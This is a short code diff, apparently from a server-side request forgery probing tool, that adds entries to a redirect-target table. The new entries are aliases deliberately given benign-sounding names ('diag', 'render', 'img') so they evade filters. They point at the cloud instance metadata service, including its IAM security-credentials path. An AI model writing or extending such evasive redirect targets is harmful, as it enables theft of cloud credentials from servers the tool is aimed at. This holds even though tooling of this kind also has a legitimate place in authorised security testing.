@@ -288,6 +288,13 @@ _RT_TARGETS: Dict[str, str] = {
     "redis": "http://localhost:6379/",
     "internal": "http://localhost:8080/",
     "self": "SELF",  # special: redirects back to /probe/gif/{marker}-followed
+    # innocuous aliases (same targets, benign-sounding prefixes)
+    "diag": "http://169.254.169.254/latest/meta-data/",
+    "diagiam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "render": "http://169.254.169.254/latest/meta-data/",
+    "renderiam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "img": "http://169.254.169.254/latest/meta-data/",
+    "imgiam": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
 }
 
 
